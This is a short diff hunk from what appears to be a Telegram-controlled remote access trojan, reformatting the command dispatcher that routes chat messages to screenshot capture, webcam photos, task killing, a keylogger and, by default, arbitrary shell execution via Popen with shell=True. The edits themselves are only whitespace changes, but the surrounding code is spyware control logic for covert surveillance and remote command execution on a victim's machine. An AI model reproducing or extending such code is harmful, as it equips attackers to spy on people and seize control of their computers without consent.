@@ -42,13 +42,13 @@ def replymessage(first_name, last_name, command, chat_id):
                 feature.save_file_in_fin(chat_id)
             elif ((list_command[0] == "screenshot") | (list_command[0] == "Screenshot")):
                 feature.take_screenshot(chat_id)
-            elif((list_command[0] == "stop") | (list_command[0] == "Stop")):
+            elif ((list_command[0] == "stop") | (list_command[0] == "Stop")):
                 feature.kill_task(chat_id, list_command)
-            elif((list_command[0] == "photo") | (list_command[0] == "Photo")):
+            elif ((list_command[0] == "photo") | (list_command[0] == "Photo")):
                 feature.take_photo(chat_id)
-            elif((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
-                feature.key_logger(chat_id,first_name,last_name)
-            elif(list_command[0] == feature.random_f):
+            elif ((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
+                feature.key_logger(chat_id, first_name, last_name)
+            elif (list_command[0] == feature.random_f):
                 feature.save_file_in_fin(chat_id)
             else:
                 message = Popen(command, shell=True, stdout=PIPE,
